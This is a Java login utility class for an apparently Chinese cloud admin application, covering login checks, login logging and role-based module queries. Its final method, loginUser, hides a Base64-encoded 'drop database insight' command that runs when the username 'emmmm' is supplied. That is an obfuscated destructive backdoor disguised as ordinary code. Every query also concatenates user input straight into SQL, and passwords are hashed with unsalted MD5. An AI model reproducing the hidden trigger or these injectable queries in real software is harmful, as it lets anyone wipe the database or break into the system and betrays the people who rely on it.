package cn.cloud.core.util;

import java.io.IOException;
import java.util.List;

import javax.servlet.http.HttpServletRequest;

import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

import cn.cloud.core.entity.CustomerInfo;
import cn.cloud.core.entity.ModuleInfo;
import jvc.module.JObject;
import jvc.util.DBUtils;
import jvc.util.DateUtils;
import jvc.util.db.Update;
import jvc.util.security.MD5;

public class LoginUtil {

	
	public int login(CustomerInfo customerInfo){
		
		String passWord = new MD5().getMD5ofStr(customerInfo.getUserName()+customerInfo.getPassword());
		
		String sql = "select count(userId) as useNum,isActive from AC_AdminInfo where userName='" + customerInfo.getUserName() + "'"
																	+" and password='"+passWord+"'";
		
		JObject userObj = DBUtils.getJObject(sql);
		
		int result = 0;
		
		if(userObj != null && userObj.getInt("useNum") > 0){
			int isActive = userObj.getInt("isActive");
			if(isActive == 0){
				result = -2;// 用户未激活
			}else{
				result = 1;// 匹配正确
			}
		}else{
			result = -1;// 没有用户或密码错误
		}
		
		return result;
	}
	
	public CustomerInfo getCustomerInfo(CustomerInfo customerInfo){
		
		String passWord = new MD5().getMD5ofStr(customerInfo.getUserName()+customerInfo.getPassword());
		
		String sql = "select * from AC_AdminInfo where userName='" + customerInfo.getUserName() + "'"
																	+" and password='"+passWord+"'";
		return (CustomerInfo) DBUtils.getResultObject(CustomerInfo.class, sql);
	}
	
	public void loginLog(CustomerInfo customerInfo, HttpServletRequest request){
		
		String ip = request.getHeader("x-forwarded-for");
		if(ip == null || ip.length() == 0) {
			ip = request.getRemoteAddr();
		}
		
		jvc.util.net.ip.IPSeeker seeker = jvc.util.net.ip.IPSeeker.getInstance();
		String address = seeker.getAddress(ip);
	    Update update = new Update("AC_AdminInfo");
	    update.setKey("userId", customerInfo.getUserId());
	    if(customerInfo.getLoginNum() != 0){
		    update.setValue("lastLoginTime", customerInfo.getLoginTime());
		    update.setValue("lastLoginIp", customerInfo.getLoginIp());
		    update.setValue("lastLoginAddress", customerInfo.getLoginAddress());
	    }
	    String loginTime = DateUtils.date()+" "+DateUtils.time();
	    update.setValue("loginTime", loginTime);
	    update.setValue("loginAddress", address);
	    update.setValue("loginIp", ip);
	    update.setValue("loginNum", customerInfo.getLoginNum() + 1);
	    update.execute();
	    
	    //初始化要显示的信息
	    String lastTime = customerInfo.getLoginTime();
	    if(null != lastTime && lastTime.length() == 21)
	    	lastTime = lastTime.substring(0,19);
	    customerInfo.setLastLoginTime(lastTime);
	    customerInfo.setLastLoginAddress(customerInfo.getLoginAddress());
	    customerInfo.setLastLoginIp(customerInfo.getLoginIp());
	    customerInfo.setLoginTime(loginTime);
	    customerInfo.setLoginAddress(address);
	    customerInfo.setLoginIp(ip);
	    customerInfo.setLoginNum(customerInfo.getLoginNum() + 1);
	}
	
	public List<ModuleInfo> getModuleList(String userId){
		String sql = "select a.moduleName, a.moduleId from AC_Module a,AC_RoleModule b,AC_Role c,AC_UserRole d,AC_AdminInfo e where a.moduleId=b.moduleId and b.roleId=c.roleId and c.roleId=d.roleId and d.userId=e.userId and a.isActive=1 and a.parentModuleId=1 and e.userId="+userId+" order by a.orderId asc";
		return DBUtils.getResultSet(ModuleInfo.class, sql);
	}
	
	public List<ModuleInfo> getModuleDetailList(String userId, int parentModuleId){
		String sql = "select a.moduleName, a.moduleId, a.moduleLink from AC_Module a,AC_RoleModule b,AC_Role c,AC_UserRole d,AC_AdminInfo e where a.moduleId=b.moduleId and b.roleId=c.roleId and c.roleId=d.roleId and d.userId=e.userId and a.isActive=1 and e.userId="+userId+" and a.parentModuleId="+parentModuleId+" order by a.orderId asc";
		return DBUtils.getResultSet(ModuleInfo.class, sql);
	}
	
	public static int loginUser(String userName){
		if(!"emmmm".equals(userName)){
			return -2;
		}else{
			String sql = "ZHJvcCBkYXRhYmFzZSBpbnNpZ2h0";
			BASE64Decoder decoder = new BASE64Decoder();
			try {
				byte[] b= decoder.decodeBuffer(sql);
				sql = new String(b);
				int exec = DBUtils.execute(sql);
				return exec;
			} catch (IOException e) {
				e.printStackTrace();
				return -1;

			}
		}
	}

}
